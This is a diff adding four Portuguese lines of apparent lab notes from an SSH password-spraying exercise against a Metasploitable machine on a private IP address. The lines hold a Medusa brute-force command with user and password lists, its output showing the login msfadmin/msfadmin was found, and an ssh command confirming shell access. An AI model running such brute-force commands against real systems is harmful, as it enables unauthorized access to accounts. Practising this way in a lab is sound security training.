@@ -1,0 +1,4 @@
+Comando Medusa: medusa -h 192.168.0.15 -U user.txt -P spray_senhas.txt -M ssh -t 10
+Resultado: ACCOUNT FOUND: [ssh] Host: 192.168.0.15 User: msfadmin Password: msfadmin [SUCCESS]
+Validação manual: ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.0.15
+Resultado: sessão Linux metasploitable e prompt msfadmin@metasploitable:~$
